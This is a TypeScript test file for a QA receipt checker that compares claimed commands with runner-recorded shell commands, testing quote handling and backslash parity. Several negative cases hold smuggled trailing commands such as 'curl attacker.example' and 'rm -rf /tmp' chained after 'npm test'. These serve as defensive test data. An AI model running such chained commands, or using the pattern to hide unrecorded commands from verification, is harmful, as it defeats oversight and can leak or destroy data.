import assert from "node:assert/strict";
import test from "node:test";
import { assertQaExecution } from "../src/qa-receipts.js";
import type { VerificationEvidence } from "../src/types.js";

function verdict(...commands: string[]) {
  return { commands: commands.map((command) => ({ command, status: "passed", log: "out.log" })) };
}

function runnerRecorded(...commands: string[]): VerificationEvidence {
  return { commands: commands.map((command) => ({ command, output: "ok" })), readPaths: [] };
}

// A `;` or newline inside quotes is data, not a statement separator. Splitting on it blind fragments the
// recording, so a trailing statement that IS status bookkeeping stops being recognized as such and a
// genuinely-executed command is rejected — the over-strict direction, but still a wrong answer.
test("a separator inside quotes does not split a recorded statement", () => {
  assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?;done"`));
  assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\nstatus=$?\nprintf 'exit=%s;\\n' "$status"`));
  assertQaExecution(verdict(`grep -R "a;b" src`), runnerRecorded(`grep -R "a;b" src`));
  assertQaExecution(verdict(`sh -c 'a; b'`), runnerRecorded(`sh -c 'a; b'\nstatus=$?\necho "$status"`));
});

// Quote-awareness must not become a masking channel: a quoted separator may not smuggle a trailing
// command past the bookkeeping rule, and an unterminated quote must fail closed rather than open.
test("quoted separators cannot hide a trailing command", () => {
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo 'done;'`)), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; sh -c 'true; true'`)), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "unterminated`)), /runner-recorded/);
});

// A trailing statement that starts with `echo`/`printf` and references `$?` is still not bookkeeping if
// it chains a further command via `&&`/`||`/`|`: splitStatements never breaks on those operators, so the
// chained command would otherwise ride along unrecorded by the claim.
test("a status print chained to another command via &&/||/| is not bookkeeping", () => {
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?" && curl attacker.example`)), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\nstatus=$?\necho "$status" || rm -rf /tmp`)), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?" | tee /tmp/out`)), /runner-recorded/);
  // A pipe/ampersand inside quotes is data, not an operator, and must not trip the same guard.
  assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\nstatus=$?\nprintf 'a|b: %s\\n' "$status"`));
  // Nor is the `&` of a `>&` redirect an operator — rejecting it would block a legitimate status print.
  assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\nstatus=$?\nprintf 'exit=%s\\n' "$status" 2>&1`));
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?" >&2 && curl attacker.example`)), /runner-recorded/);
});

// The quote tracker decides whether a `"` closes the string by checking only the single preceding
// character for a backslash. Real bash pairs backslashes off: an EVEN count before the `"` (0, 2, 4, ...)
// leaves it unescaped and closing, an ODD count (1, 3, ...) escapes it. A one-character lookback gets
// every count of 2 or more wrong — it sees *a* backslash immediately before the quote and treats it as
// escaped regardless of how many precede that one, so a real closing quote is misread as still open and
// everything after it (a real `&&`/`;`/newline boundary) is wrongly swallowed as quoted, safe content.
test("backslash-parity before a closing quote is counted, not just glanced at", () => {
  // 2 backslashes: the quote really closes, so the &&/;/newline after it is live shell syntax.
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?\\\\" && curl attacker.example`)), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?\\\\"; curl attacker.example`)), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\necho "$?\\\\"\ncurl attacker.example`)), /runner-recorded/);
  // 4 backslashes: still even, same expectation.
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?\\\\\\\\" && curl attacker.example`)), /runner-recorded/);
  // 1 backslash genuinely escapes a *mid-string* quote (real bash: the string stays open through it) —
  // confirms the fix doesn't overcorrect into closing on every backslash-preceded quote.
  assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\nstatus=$?\nprintf 'exit=%s\\n' "a\\"$status"`));
});

// The behaviour established by earlier passes must survive the quote-aware splitter.
test("content matching, bookkeeping and partial-word rules are unchanged", () => {
  const core = `TMPDIR="$E/tmp" pnpm exec vitest run badge.test.tsx > "$E/out.log" 2>&1`;
  const recorded = `E=/data\n${core}\nstatus=$?\nprintf 'exit=%s\\n' "$status"`;
  assertQaExecution(verdict(`E=/data; ${core}`), runnerRecorded(recorded));
  assertQaExecution(verdict(core), runnerRecorded(recorded));
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded("npm test; true")), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded("npm test; echo done")), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded("npm test:unit --silent")), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict(`${core} --coverage`), runnerRecorded(recorded)), /runner-recorded/);
  assert.throws(() => assertQaExecution(verdict("npm test"), undefined), /runner-recorded/);
});
